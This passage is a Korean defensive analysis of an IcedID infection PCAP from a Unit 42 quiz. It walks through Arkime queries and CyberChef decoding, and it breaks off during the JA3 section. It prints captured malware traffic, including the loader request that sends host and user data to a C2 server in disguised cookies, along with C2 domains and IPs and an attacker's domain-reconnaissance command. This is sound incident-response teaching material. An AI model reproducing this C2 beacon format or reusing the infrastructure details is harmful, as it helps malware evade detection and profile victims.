---
title: IcedID (Cold as Ice) — 리다이렉트·Firebase·가짜 gzip에서 HTTPS 비콘과 BackConnect까지 (Arkime 분석)
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - icedid
  - loader
  - c2
---

# IcedID (Cold as Ice) — 리다이렉트·Firebase·가짜 gzip에서 HTTPS 비콘과 BackConnect까지 { #icedid-cold-as-ice }

!!! abstract "사례 요약"
    `boogienights.live` 도메인의 윈도우 PC 3대 중 한 대에서 사용자가 Edge로 **IP 주소로 된 링크**(`80.77.25.175/main.php`)를 열었습니다. 이 서버는 PC를 **Google Firebase Storage**로 보냈고, PC는 거기서 `Scan_Inv.zip`을 받았습니다. 압축 안의 **IcedID 설치 파일**이 실행되자 PC 정보를 **쿠키에 담아** 보내고, `application/gzip`으로 **위장한 악성 파일**을 받았어요. 그 뒤로 PC는 **자체 서명 인증서**를 쓰는 HTTPS C2에 **5분마다** 접속했습니다(약 6시간). 그리고 감염 약 5시간 뒤에는 **BackConnect**라는 원격 조종 통로가 열려서, 공격자가 직접 `net group "Domain Computers" /domain`을 치고 드라이브와 폴더를 둘러봤습니다. RedLine처럼 36초짜리 짧은 PCAP이 아니라 **6시간짜리 긴 PCAP**이라 찾는 방법이 다릅니다.

| | |
|---|---|
| **증거** | Unit 42 Wireshark 퀴즈 2023년 4월 PCAP("Cold as Ice"), 2023-04-19 15:26:28 – 21:22:36 UTC (약 5시간 56분), 세션 약 1,640개 |
| **환경** | 폐쇄망 가정(해시·평판 조회 없음). 분석 순서와 쿼리는 Arkime 기준, 디코딩은 CyberChef |
| **결과물** | 퀴즈 6문항의 답 |
| **관련 페이지** | [Arkime만으로 분석하기 — Trickbot 사례](arkime-only-credential-theft-tls-c2.md) · [RedLine Stealer 사례](redline-stealer-powershell-nettcp-c2.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) |

!!! warning "먼저 혼자 풀어 보고 싶다면"
    아래부터는 정답이 나옵니다. 먼저 풀어 보려면 여기서 멈추고 이 6문항에 답해 보세요.

    1. 감염이 시작된 날짜와 시간(UTC)
    2. 감염된 윈도우 PC의 IP 주소
    3. MAC 주소
    4. 호스트이름
    5. 사용자 계정 이름
    6. 감염 뒤에 이어진 후속 악성 활동이 있었나? 있었다면 무엇인가?

!!! note "이 페이지의 숫자에 대해"
    이 페이지는 PCAP을 Python으로 직접 분석해서 Arkime가 보여줄 값(세션, 바이트, 필드)을 계산하고, 그 값을 찾는 Arkime 쿼리와 함께 정리했습니다. 세션 수 같은 일부 숫자는 Arkime 화면과 조금 다를 수 있으니 직접 따라 할 때 확인하세요. 결과는 Unit 42 공식 정답과 [대조](#official-answers)했습니다.

!!! tip "이 페이지 읽는 법"
    앞의 두 사례와 같은 순서로 씁니다. 단계마다 **목적 → 쿼리 → 쿼리 해설 → 실제 결과 → 결과 읽기**. 쿼리는 코드 블록 오른쪽 **복사 버튼**으로 복사하세요. 시간 범위·시간대·SPI View 같은 기본 사용법은 Trickbot 사례의 [0~1단계](arkime-only-credential-theft-tls-c2.md#step-0)에 자세히 있습니다.

## 한눈에 보는 답 { #answers }

| # | 질문 | 답 | 상태 |
|---|---|---|---|
| 1 | 감염 시작 | **2023-04-19 15:31 UTC** (첫 악성 요청: 15:31:07 `GET /main.php`) | 확인됨 |
| 2 | IP | **10.4.19.136** | 확인됨 |
| 3 | MAC | **14:58:d0:2e:c5:ae** | 확인됨 |
| 4 | 호스트이름 | **DESKTOP-SFF9LJF** | 확인됨 |
| 5 | 사용자 | **csilva** (LDAP 전체 이름 Cornelius Silva) | 확인됨 |
| 6 | 후속 활동 | **있음 — BackConnect.** 20:48 UTC부터 193.149.176.100:443(TLS 아님)으로 원격 셸과 파일 관리자가 열림. 공격자가 `net group "Domain Computers" /domain` 실행, 드라이브·C:\ 목록 확인 | 확인됨 |

| 항목 | 값 |
|---|---|
| 네트워크 | 10.4.19.0/24, 게이트웨이 10.4.19.1, DC/DNS **10.4.19.19 (WIN-GP4JHCK2JMV)**, 도메인 `boogienights.live` |
| 클라이언트 | 10.4.19.136 DESKTOP-SFF9LJF(감염), 10.4.19.138 DESKTOP-RETP4BU, 10.4.19.143 DESKTOP-JAL4D68 |
| 시작 링크 | `hxxp://80.77.25[.]175/main.php` → 302 → Firebase Storage `Scan_Inv.zip` |
| gzip 로더 | `hxxp://skigimeetroc[.]com/` (192.153.57.233), 쿠키에 PC 정보, 응답 520,803바이트 |
| HTTPS C2 | `askamoshopsi[.]com`·`spakernakurs[.]com` (104.168.53.18), `skansnekssky[.]com` (217.199.121.56, 5분 비콘) |
| BackConnect | **193.149.176.100:443** (raw TCP) |
| 덤 | 10.4.19.138이 17:17에 Qakbot 배포와 비슷한 zip(.wsf)을 받음 — [11단계](#second-host) |

---

## 0단계 — 데이터 범위와 전체 그림 { #step-0 }

**목적:** 데이터의 시작·끝, 크기, 내부 PC를 먼저 파악합니다.

**쿼리:** 시간 범위를 **All**로 바꾸고 검색창은 비운 채 Search. Sessions에서 Start Time 오름차순 / Stop Time 내림차순으로 시작·끝을 봅니다(방법은 [Trickbot 사례 1단계](arkime-only-credential-theft-tls-c2.md#data-range)).

**실제 결과:**

```text
Start  2023/04/19 15:26:28 UTC
End    2023/04/19 21:22:36 UTC   (duration 05:56:08)
Sessions about 1,640
Src IP 10.4.19.138 (833)   10.4.19.136 (718)   10.4.19.143 (85)   10.4.19.19 (4)
```

SPI View → General → Dst Port (세션 수, 프로토콜/포트):

```text
udp 53 (586)   tcp 443 (483)   tcp 389 (114)   tcp 445 (85)   udp 389 (73)   tcp 135 (67)
tcp 49669 (63) tcp 88 (63)     tcp 80 (47)     tcp 49684 (12) tcp 139 (11)   udp 1900 (9)
tcp 53 (6)     udp 137 (5)     udp 138 (4)     udp 123 (3)    udp 111 (3)    udp 5353 (2)   udp 5355 (1)
```

**결과 읽기:**

- **캡처가 6시간 가까이** 됩니다. RedLine 사례(36초)처럼 세션 목록을 눈으로 훑어서는 끝이 안 나요. 이번에는 **"걸러내고 남은 것을 보는"** 방법을 씁니다.
- 내부 IP는 4개입니다. 10.4.19.19는 세션을 거의 시작하지 않고(4개) 받기만 하니 **서버**(뒤에서 DC로 확인)입니다. 나머지 **3대가 클라이언트 PC**예요. 퀴즈도 "클라이언트 3대 중 한 대만 감염"이라고 했습니다.
- 포트를 역할별로 나누면:

| 포트 | 프로토콜 | 판단 |
|---|---|---|
| 53, 88, 389, 445, 135, 139, 49669·49684(동적 RPC), 123 | DNS, Kerberos, LDAP, SMB, RPC, NTP | **정상 AD 통신**. 대부분 10.4.19.19로 감 |
| 137/138, 1900, 5353, 5355, 111 | NetBIOS, SSDP, mDNS, LLMNR, RPC 포트매퍼 | 로컬 잡음 |
| **443 (483)** | HTTPS | 대부분 Microsoft·Bing 서비스. 그 안에 숨은 것을 찾아야 함 |
| **80 (47)** | HTTP | **평문** — 내용을 다 볼 수 있으니 꼭 봄 |

- **RedLine 때와 달리 "모르는 포트"가 없습니다.** 악성 통신이 80과 443 안에 숨어 있다는 뜻이에요. 그래서 순서를 이렇게 잡습니다: **PC 3대의 정체 → DNS로 수상한 이름 → 평문 HTTP → HTTPS(인증서·주기) → 443인데 TLS가 아닌 것**.

---

## 1단계 — 클라이언트 3대의 IP·MAC·호스트이름 (Q2~Q4) { #hosts }

**목적:** 누가 감염됐는지 아직 모르니, **3대 모두의 정체**를 먼저 적어 둡니다. 나중에 "어느 PC가 이상한 곳에 갔나"를 찾으면 바로 이름을 붙일 수 있어요.

### DHCP부터 확인

```text
protocols == dhcp
```

**실제 결과:** `0 sessions`

이 PCAP에는 **DHCP가 없습니다.** PC들이 이미 IP를 받은 뒤부터 캡처했다는 뜻이에요. RedLine 사례의 팁대로 **Kerberos, NetBIOS, 이더넷 MAC**으로 찾습니다.

### Kerberos의 컴퓨터 계정

```text
ip.src == 10.4.19.0/24 && protocols == krb5
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.4.19.0/24` | 내부망 PC가 시작한 연결 (CIDR 표기) |
| `&&` | 그리고 |
| `protocols == krb5` | Kerberos 세션만 |

SPI View → **krb5** → `krb5.cname`을 **Load All**. 그리고 같은 화면 **General**에서 `ip.src`와 `mac.src`도 펼칩니다. 값을 누르고 **"and"**를 고르면 그 값으로 검색이 좁혀져서, IP마다 cname을 하나씩 확인할 수 있어요.

**실제 결과:**

```text
Src IP        Src MAC             krb5.cname (컴퓨터 계정, $로 끝남)
10.4.19.136   14:58:d0:2e:c5:ae   desktop-sff9ljf$  (+ 사용자 계정 csilva → 3단계)
10.4.19.138   00:90:27:cd:92:90   desktop-retp4bu$
10.4.19.143   00:02:a5:7c:61:08   desktop-jal4d68$
10.4.19.19    00:21:5a:86:39:8f   (서버, DC)
```

### NetBIOS로 교차 확인

```text
ip.src == 10.4.19.0/24 && port.dst == [137, 138]
```

| 조각 | 뜻 |
|---|---|
| `port.dst == [137, 138]` | 목록 표기. 137(NetBIOS 이름) **또는** 138(NetBIOS 데이터그램) |

세션을 펼치면 브로드캐스트 안에 이름이 보입니다.

```text
15:26:37  10.4.19.19   WIN-GP4JHCK2JMV   BOOGIENIGHTS   __MSBROWSE__
15:33:47  10.4.19.136  DESKTOP-SFF9LJF   BOOGIENIGHTS
17:06:20  10.4.19.138  DESKTOP-RETP4BU   BOOGIENIGHTS
```

**결과 읽기:**

- Kerberos와 NetBIOS가 같은 이름을 줍니다. **출처 두 곳이 일치**하면 확실합니다.

| IP | MAC | 호스트이름 |
|---|---|---|
| 10.4.19.136 | 14:58:d0:2e:c5:ae | DESKTOP-SFF9LJF |
| 10.4.19.138 | 00:90:27:cd:92:90 | DESKTOP-RETP4BU |
| 10.4.19.143 | 00:02:a5:7c:61:08 | DESKTOP-JAL4D68 |
| 10.4.19.19 | 00:21:5a:86:39:8f | WIN-GP4JHCK2JMV (DC) |

- **MAC은 같은 LAN 안에서만 의미가 있습니다.** 이 PC들의 패킷이 바깥으로 갈 때 `mac.dst`는 모두 **00:02:17:5c:e6:13**인데, 이건 상대 서버가 아니라 **게이트웨이(10.4.19.1)**의 MAC이에요. Q3의 답은 PC가 보낸 패킷의 `mac.src`에서 찾아야 합니다.
- DC가 `WIN-` + 무작위 글자 이름인 건 RedLine 사례와 같아요(윈도우 서버 기본 이름).
- 아직 어느 PC가 감염됐는지는 모릅니다. 다음 단계에서 찾습니다.

---

## 2단계 — DNS로 수상한 이름 찾기, 감염 PC 좁히기 { #dns }

**목적:** 3대가 조회한 이름에서 **정상 이름을 걸러내고 남는 것**을 찾습니다. 남은 이름을 조회한 PC가 감염 후보예요.

**쿼리:**

```text
ip.src == 10.4.19.0/24 && protocols == dns
```

SPI View → **dns** → `host.dns` → **Load All**. 목록이 길면 PC 하나씩(`ip.src == 10.4.19.136 && protocols == dns`) 봅니다.

**실제 결과 (10.4.19.136, 이름 51개 중 일부를 성격별로 묶음):**

```text
AD / 내부      WIN-GP4JHCK2JMV.boogienights.live, _ldap._tcp.dc._msdcs.boogienights.live, wpad.boogienights.live
Microsoft      *.msn.com, *.bing.com, *.microsoft.com, *.msedge.net, *.windowsupdate.com, *.live.com,
               *.office.com, ecn.dev.virtualearth.net, fp-afd.azurefd.us ...
기타 정상      update.googleapis.com, acroipm2.adobe.com
?              firebasestorage.googleapis.com   15:31:10
???            skigimeetroc.com                  15:35:39  → 192.153.57.233
???            askamoshopsi.com                  15:36:41  → 104.168.53.18
???            skansnekssky.com                  15:36:43  → 217.199.121.56  (그 뒤 약 30분마다 다시 조회)
???            spakernakurs.com                  20:12:16  → 104.168.53.18
```

**결과 읽기:**

- `skigimeetroc`, `askamoshopsi`, `skansnekssky`, `spakernakurs` — **사람이 지었다고 보기 어려운 무작위 단어 같은 .com 이름**이 4개 있습니다. 넷 다 같은 PC(10.4.19.136)가 조회했어요.
- `firebasestorage.googleapis.com`은 **Google의 정상 서비스**입니다. 그런데 공격자가 무료로 파일을 올려 두는 데 자주 악용돼요. 정상 이름이라고 바로 지우지 말고, 앞뒤 시간(15:31)을 기억해 둡니다.
- `askamoshopsi`와 `spakernakurs`는 **같은 IP**(104.168.53.18)로 풀립니다. 이름은 달라도 같은 서버예요.
- **15:31 → 15:35 → 15:36**으로 이어지는 짧은 시간에 이상한 이름이 몰려 있습니다. 감염 시점의 강한 단서입니다.

이 이름들을 다른 PC도 조회했는지 바로 확인합니다.

```text
host.dns == [skigimeetroc.com, askamoshopsi.com, skansnekssky.com, spakernakurs.com]
```

| 조각 | 뜻 |
|---|---|
| `host.dns == [a, b, c, d]` | 이 네 이름 중 **하나라도** 조회한 세션 |

**실제 결과:** 모든 세션의 `ip.src`가 **10.4.19.136**입니다. → **감염 PC는 10.4.19.136 (DESKTOP-SFF9LJF).** Q2·Q3·Q4는 1단계 표에서 바로 나옵니다.

!!! note "10.4.19.138도 이상한 이름이 있다"
    10.4.19.138의 DNS를 보면 17:12~17:15에 `nobpc.joansstudio.store`, `dlmfz.joansstudio.store`(둘 다 **NXDOMAIN**, 없는 이름), 17:17에 `cotecsecuritygroup.com`이 나옵니다. 10.4.19.136과는 전혀 다른 이름이에요. 이건 [11단계](#second-host)에서 따로 봅니다. 10.4.19.143은 내부 이름만 조회했습니다.

---

## 3단계 — 사용자 계정 찾기 (Q5) { #user }

**목적:** 10.4.19.136에 로그인한 사용자 계정을 찾습니다.

### Kerberos

```text
ip.src == 10.4.19.136 && protocols == krb5
```

**실제 결과:**

```text
Time      19:30:50 – 19:34:48 (12 sessions)
cname     csilva   desktop-sff9ljf$
Realm     BOOGIENIGHTS.LIVE
sname     krbtgt/BOOGIENIGHTS.LIVE ...
```

**결과 읽기:**

- `$`가 없는 **`csilva`가 사용자 계정**입니다. Q5의 답이에요.
- 그런데 Kerberos가 **19:30에야** 나옵니다. 캡처가 사용자 로그인 **뒤**에 시작됐기 때문이에요(DHCP가 없는 것과 같은 이유). 19:30의 Kerberos는 티켓 갱신이나 공유 드라이브 접속(같은 시각 SMB로 `\\WIN-GP4JHCK2JMV\For_Shared_Drive` 접속) 때 나온 것으로 보입니다. **긴 PCAP에서는 Kerberos가 맨 앞에 없을 수도 있다**는 걸 기억하세요.

### LDAP로 전체 이름까지

```text
ip.src == 10.4.19.136 && ip.dst == 10.4.19.19 && port.dst == 389
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == 10.4.19.19` | DC로 간 연결 |
| `port.dst == 389` | LDAP |

세션 목록에서 19:34:48 세션을 펼치고 **ASCII**로 보면 이런 줄이 있습니다.

```text
CN=Cornelius Silva,CN=Users,DC=boogienights,DC=live
```

!!! tip "어디 있는지 모를 때는 Hunt"
    Arkime 위쪽 메뉴의 **Hunt**는 패킷 내용에서 문자열을 찾아 줍니다. 검색창에 `ip.src == 10.4.19.136 && port.dst == 389`를 넣어 대상을 좁힌 뒤, Hunt에서 ASCII 문자열 `CN=Users`를 찾으면 사용자 DN이 든 세션만 남아요. 결과는 `huntId` 태그로 다시 검색할 수 있습니다.

- 사용자 **csilva = Cornelius Silva**. 이 값은 [6단계](#gzip-loader)에서 악성코드가 보낸 쿠키로 **한 번 더** 확인됩니다.

---

## 4단계 — 평문 HTTP: 첫 악성 요청과 리다이렉트 (Q1) { #http }

**목적:** 10.4.19.136의 평문 HTTP를 모두 보고, 정상 윈도우 통신을 걸러낸 뒤 남는 요청을 읽습니다.

**쿼리:**

```text
ip.src == 10.4.19.136 && protocols == http
```

SPI View → **http** → `host.http` → **Load All**.

**실제 결과 (`host.http`, 요청 수):**

```text
msedge.b.tlu.dl.delivery.mp.microsoft.com (37)   ctldl.windowsupdate.com (8)   go.microsoft.com (5)
dmd.metaservices.microsoft.com (5)   acroipm2.adobe.com (2)   adl.windows.com (1)   ocsp.digicert.com (1)
www.ssl.com (1)   80.77.25.175 (1)   skigimeetroc.com (1)
```

Microsoft 업데이트, 인증서 확인(OCSP, CTL), Adobe는 정상입니다. 남는 건 **IP 주소 그대로인 `80.77.25.175`**, `www.ssl.com`, `skigimeetroc.com` 세 개예요. 시간순으로 첫 번째부터 봅니다.

```text
host.http == 80.77.25.175
```

**실제 결과 (세션 상세 → 요청과 응답):**

```text
15:31:07  10.4.19.136:51112 → 80.77.25.175:80

GET /main.php HTTP/1.1
Host: 80.77.25.175
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
            Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48
Cookie: _subid=17dk1e9d14f; 34ab8=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1wic3RyZWFtc1wiOntcIjIzOFwiOjE2ODE5MTc2NDF9LFwiY2FtcGFpZ25zXCI6e1wiNTBcIjoxNjgxOTE3NjQxfSxcInRpbWVcIjoxNjgxOTE3NjQxfSJ9.9LQVO7Pp3-oH0HEmBnzaa7p8B8jot16pqisEvgs-bII

HTTP/1.1 302 Moved Temporarily
Server: nginx
Set-Cookie: PHPSESSID=ocno7kgfbvjnu3lho0d6pftkge; path=/
Set-Cookie: 34ab8=eyJ0eXAi...(새 JWT); expires=Thu, 20-Apr-2023 15:31:10 GMT
Set-Cookie: _subid=17dk1e9d14g; expires=Thu, 20-Apr-2023 15:31:10 GMT
Location: https://firebasestorage.googleapis.com/v0/b/serene-cathode-377701.appspot.com/o/XSjwp6O0pq%2FScan_Inv.zip?alt=media&token=a716bdce-1373-44ed-ae89-fdabafa31c61
```

### CyberChef로 쿠키 읽기

`34ab8=` 뒤 값은 점(`.`)으로 나뉜 세 덩어리, 즉 **JWT**(JSON Web Token)입니다. 앞 두 덩어리를 CyberChef에 넣습니다.

| 레시피 | 설정 |
|---|---|
| **JWT Decode** | 기본값 (JWT 전체를 넣으면 바로 JSON이 나옴) |
| 또는 **From Base64** | Alphabet을 `URL safe (A-Za-z0-9-_)`로. 덩어리 하나씩 |

**결과:**

```text
{"typ":"JWT","alg":"HS256"}
{"data":"{\"streams\":{\"238\":1681917641},\"campaigns\":{\"50\":1681917641},\"time\":1681917641}"}
```

`1681917641`은 UNIX 시간입니다. CyberChef **From UNIX Timestamp**(Units: Seconds) → `Wed 19 April 2023 15:20:41 UTC`.

**결과 읽기:**

- **15:31:07이 이 PCAP에서 보이는 첫 악성 요청**입니다. Q1의 답은 **2023-04-19 15:31 UTC**예요.
- **주소가 도메인이 아니라 IP**이고, DNS 조회도 없습니다. 사용자가 링크를 눌렀는데 그 링크가 처음부터 IP로 되어 있었다는 뜻이에요. User-Agent가 진짜 **Edge 112**이니 사람이 브라우저로 연 것입니다(링크가 메일에서 왔는지는 PCAP으로 알 수 없음).
- 응답은 내용 없이 **302(다른 곳으로 가라)**만 주고, **Firebase Storage의 `Scan_Inv.zip`**으로 보냅니다. 이렇게 "방문자를 골라서 다음 장소로 보내는 서버"를 **TDS(Traffic Distribution System)**라고 해요. `_subid`, JWT 안의 `streams`·`campaigns`는 TDS가 "어느 캠페인에서 온 방문자인지" 세는 값으로 보입니다(추정).
- 재미있는 점: 브라우저가 **요청할 때 이미** 이 쿠키를 갖고 있었고, 쿠키 안 시간은 **15:20:41**입니다. 캡처 시작(15:26:28)보다 앞이에요. 이 PC가 **10분 전에도 이 서버에 왔었다**는 뜻으로 보입니다(추정). 다만 PCAP에 보이는 첫 악성 통신은 15:31이니, 보고서에는 15:31을 쓰고 이 사실은 메모로 남깁니다.
- 파일 이름 `Scan_Inv`(스캔한 송장)는 업무 메일로 위장할 때 흔한 이름입니다.

!!! note "왜 Firebase일까"
    `firebasestorage.googleapis.com`은 Google 인증서를 쓰는 정상 도메인이라 차단 목록에 잘 안 걸리고, 평판 검사도 통과하기 쉽습니다. 공격자가 **정상 클라우드 서비스에 파일을 올려 두는** 건 아주 흔한 방법이에요. 그래서 "도메인이 정상"인 것보다 **"어디서 그 주소로 보내졌나(302의 출처)"**가 더 중요합니다.

---

## 5단계 — HTTPS 다운로드: Firebase의 Scan_Inv.zip { #firebase }

**목적:** 302 뒤에 Firebase에서 실제로 무엇을, 얼마나 받았는지 확인합니다.

**쿼리:**

```text
ip.src == 10.4.19.136 && host.http == firebasestorage.googleapis.com
```

| 조각 | 뜻 |
|---|---|
| `host.http` | HTTP의 Host 헤더, 그리고 **HTTPS의 서버 이름(SNI)**도 이 필드에 들어감 |

**실제 결과:**

```text
15:31:14  10.4.19.136 → 142.251.32.234:443   tls   SNI firebasestorage.googleapis.com
          Src databytes 1,524   Dst databytes 273,619       ← download
15:31:14  10.4.19.136 → 142.251.32.234:443   tls   SNI firebasestorage.googleapis.com
          Src databytes 591     Dst databytes 5,848
```

**결과 읽기:**

- 302를 받고 **7초 뒤** HTTPS로 **약 273KB**를 받았습니다. 암호화돼서 내용은 못 보지만 크기가 Unit 42가 밝힌 `Scan_Inv.zip`(262,343바이트)에 TLS 머리 몫을 더한 정도와 맞아요.
- Unit 42에 따르면 이 zip은 **비밀번호(1235)가 걸린 압축**이고 안에 **`Scan_Inv.exe`(IcedID 설치 파일)**가 있습니다. 비밀번호 압축은 메일 게이트웨이의 백신 검사를 피하려는 흔한 방법이에요.

### 그다음 4분 — 사용자가 압축을 풀고 실행하는 시간

다음 이상한 통신(skigimeetroc.com)은 **15:35:39**입니다. 그 사이 15:34:33에 이런 요청이 있어요.

```text
15:34:33  GET http://www.ssl.com/repository/SSLcom-RootCA-EV-RSA-4096-R2.crt
          User-Agent: Microsoft-CryptoAPI/10.0      → 200, application/pkix-cert, 1,519 bytes
```

- `Microsoft-CryptoAPI`는 **윈도우가 인증서를 확인할 때** 쓰는 User-Agent예요. 사람이 아니라 OS가 보낸 요청입니다.
- 실행 파일이 **SSL.com이 발급한 코드 서명 인증서로 서명**되어 있으면, 윈도우가 실행 전에 서명을 확인하면서 루트 인증서를 받으러 갑니다. 시간상 사용자가 `Scan_Inv.exe`를 실행한 순간과 맞아 보여요. 다만 **추정**입니다. 확정하려면 호스트에서 파일의 서명을 직접 봐야 합니다.
- 즉 **15:31 다운로드 → 약 3~4분 동안 압축 풀기·실행 → 15:35 악성코드 첫 통신**의 흐름입니다.

---

## 6단계 — gzip 로더: 쿠키에 담긴 PC 정보 { #gzip-loader }

**목적:** 설치 파일이 처음 보낸 요청을 읽습니다. IcedID는 이때 **PC 정보를 쿠키에 숨겨** 보냅니다.

**쿼리:**

```text
host.http == skigimeetroc.com
```

**실제 결과:**

```text
15:35:39  10.4.19.136:51136 → 192.153.57.233:80   Src databytes 295   Dst databytes 520,954

GET / HTTP/1.1
Connection: Keep-Alive
Cookie: __gads=422998217:1:1808:131; _gid=A0CA96894E9D; _u=4445534B544F502D534646394C4A46:6373696C7661:46353431423635424230383346354633; __io=21_1181811818_1193560798_2439418475; _ga=1.591597.1635208534.1022; _gat=10.0.22621.64
Host: skigimeetroc.com

HTTP/1.1 200 OK
Server: nginx
Content-Type: application/gzip
Content-Length: 520803
```

응답 본문 첫 부분(Destination Raw → CyberChef **To Hex**):

```text
1f 8b 08 08 00 00 00 00 00 00 54 61 69 6c 2e 74 78 74 00 ...
                              T  a  i  l  .  t  x  t
```

**쿼리 해설 — 무엇이 이상한가:**

| 단서 | 왜 이상한가 |
|---|---|
| **User-Agent가 없음** | 브라우저는 항상 User-Agent를 보냅니다. 없으면 **프로그램이 직접 만든 요청** |
| 쿠키 이름 `__gads`, `_ga`, `_gat`, `_gid` | Google 광고·분석 쿠키 이름을 흉내 냄. 그런데 **첫 방문인데 쿠키가 있고**, 값 모양이 전혀 다름 |
| `GET /` 에 52만 바이트 `application/gzip` | 홈페이지를 요청했는데 압축 파일이 옴 |
| gzip 안 파일 이름 `Tail.txt` | gzip 헤더(`1f 8b 08 08`)의 이름 칸. 텍스트인 척하지만 크기가 52만 바이트 |

### CyberChef로 쿠키 풀기

`_u` 값을 콜론(`:`)으로 나눠 하나씩 **From Hex**에 넣습니다.

```text
4445534B544F502D534646394C4A46     → DESKTOP-SFF9LJF
6373696C7661                       → csilva
46353431423635424230383346354633   → F541B65BB083F5F3
```

나머지 값은 공개된 IcedID 분석 보고서들이 설명한 의미와 맞춰 읽습니다.

| 쿠키 | 값 | 뜻 (공개 분석 기준) |
|---|---|---|
| `_u` | 위의 hex | **컴퓨터 이름 : 사용자 이름 : 식별값** |
| `_gat` | `10.0.22621.64` | 윈도우 버전 10.0, **빌드 22621**(윈도우 11 22H2), 64비트 |
| `__io` | `21_1181811818_1193560798_2439418475` | **도메인 SID** 조각 → `S-1-5-21-1181811818-1193560798-2439418475` |
| `__gads` | `422998217:1:1808:131` | 캠페인 ID, 플래그, 시간값, 실행 중인 프로세스 수 |
| `_ga` | `1.591597.1635208534.1022` | CPU 정보(CPUID) |
| `_gid` | `A0CA96894E9D` | 네트워크 카드 주소로 만든 값 |

**결과 읽기:**

- `_u`가 **DESKTOP-SFF9LJF와 csilva**를 그대로 보여 줍니다. 1단계·3단계 답을 **악성코드가 직접 확인해 준** 셈이에요. 출처가 세 개(Kerberos, NetBIOS, 쿠키)가 됐습니다.
- 이 요청은 IcedID의 **gzip 로더(GZIPLOADER)** 단계입니다. 공개 분석에 따르면 이 "가짜 gzip" 안에는 암호화된 IcedID 본체와 설정 파일(`license.dat`)이 들어 있고, 설치 파일이 이걸 풀어서 **계속 남는(persistent) 악성코드**를 만듭니다.
- **CyberChef에서 Gunzip을 해 봐도** 안에 보이는 건 암호화된 데이터라 의미 있는 글자는 안 나옵니다. 네트워크 분석에서는 "**gzip인 척하는 큰 파일을 User-Agent 없는 요청으로 받았다**"까지 적으면 충분해요.
- 다운로드는 15:35:39~15:36:41(약 1분)이고, 끝나자마자 **15:36:41**부터 HTTPS C2가 시작됩니다(다음 단계).

!!! tip "Arkime 쿠키 필드"
    Arkime는 쿠키 이름과 값을 따로 저장합니다(`http.cookie.key`, `http.cookie.value` — 버전에 따라 이름이 다를 수 있으니 SPI View에서 확인). 이게 있으면 `http.cookie.key == __gads && http.cookie.key == _gat`로 **같은 모양의 IcedID 요청을 다른 PCAP에서도** 찾을 수 있어요. 값은 PC마다 다르지만 **쿠키 이름의 조합**은 그대로라서 좋은 행동 단서입니다.

---

## 7단계 — HTTPS C2: 자체 서명 인증서 { #https-c2 }

**목적:** 2단계에서 찾은 C2 도메인들의 TLS 세션을 봅니다. 내용은 암호화돼서 못 보니 **인증서, 크기, 시간, JA3**로 판단합니다.

**쿼리:**

```text
ip.src == 10.4.19.136 && host.http == [askamoshopsi.com, skansnekssky.com, spakernakurs.com]
```

SPI View → **tls**와 **cert** 섹션 → **Load All**.

**실제 결과:**

```text
askamoshopsi.com  104.168.53.18:443    3 sessions  15:36:41 – 15:37:50
                  databytes (src / dst)  1,286 / 2,217    1,733 / 1,764    472 / 1,907,262   ← 1.9 MB down
skansnekssky.com  217.199.121.56:443  69 sessions  15:36:44 – 21:17:46
spakernakurs.com  104.168.53.18:443    1 session   20:12:16 – 21:22:21   3,603 / 4,094

cert (3개 서버 모두 같은 형식):
  Subject   CN=localhost, O=Internet Widgits Pty Ltd, ST=Some-State, C=AU
  Issuer    CN=localhost, O=Internet Widgits Pty Ltd, ST=Some-State, C=AU
  Valid     2023-04-11 → 2024-04-10   (askamoshopsi/spakernakurs 12:36:03, skansnekssky 13:09:00)
  SAN       (없음)
tags      cert:self-signed
TLS       TLSv1.2, cipher 0xc030 (ECDHE_RSA_WITH_AES_256_GCM_SHA384)
```

**결과 읽기:**

- **Subject와 Issuer가 똑같습니다** → 자기가 자기한테 발급한 **자체 서명 인증서**예요(판별법은 [Trickbot 사례의 인증서 설명](arkime-only-credential-theft-tls-c2.md)과 같음). Arkime도 `cert:self-signed` 태그를 붙입니다.
- `Internet Widgits Pty Ltd`, `Some-State`, `AU`는 **OpenSSL로 인증서를 만들 때 아무것도 안 바꾸고 엔터만 누르면 들어가는 기본값**입니다. 실제 회사 웹사이트라면 이런 인증서를 쓸 리 없어요. 그리고 CN이 `localhost`라서 **접속한 이름(SNI)과도 맞지 않습니다.**
- 세 서버의 인증서가 **같은 날(04-11) 몇십 분 간격**으로 만들어졌습니다. 같은 운영자가 한꺼번에 준비한 인프라로 보여요.
- `askamoshopsi.com`에서 15:36:42에 **1.9MB**를 받았습니다. 내용은 암호화되어 못 보지만 C2 연결 직후의 큰 다운로드이니 **추가 모듈**로 추정합니다.
- `skansnekssky.com`은 **69번**이나 접속합니다. 이건 다음 단계에서 주기를 봅니다.
- `spakernakurs.com`은 감염 **4시간 반 뒤**에 처음 나오고 한 시간 넘게 붙어 있습니다. 같은 IP(104.168.53.18)인데 **JA3가 다릅니다**(아래). 그리고 이 세션이 시작되고 **36분 뒤**에 BackConnect(9단계)가 열려요.

```text
cert.issuer.on == "Internet Widgits Pty Ltd"
```

| 조각 | 뜻 |
|---|---|
| `cert.issuer.on` | 인증서 발급자의 조직 이름(O) |
| `"..."` | 띄어쓰기가 있는 값은 따옴표로 |

이 쿼리 하나로 **OpenSSL 기본값 인증서를 쓰는 서버**를 전부 찾을 수 있습니다. 이 PCAP에서는 위 세 서버만 나와요. 다른 PCAP에서도 바로 쓸 수 있는 "행동" 쿼리입니다.

### JA3로 보면? { #ja3 }

Trickbot 때 나온 "감염 뒤 JA3가 늘어나면 감염 증거"라는 이야기를 이 PCAP으로 다시 확인해 봅니다.

```text
ip.src == 10.4.19.136 && protocols == tls
```

SPI View → **tls** → `tls.ja3` → **Load All**.

**실제 결과 (요약):**

```text
10.4.19.136의 서로 다른 JA3: 61개
  15:31:07 이전(감염 전, 약 5분)에 나온 JA3: 5개
  15:31:07 이후 새로 나온 JA3: 56개
    - 그중 54개: www.msn.com, assets.msn.com, api.msn.com, ecn.dev.virtualearth.net, edge.microsoft.com,
                 th.bing.com ...  (거의 다 1번씩만 쓰임)
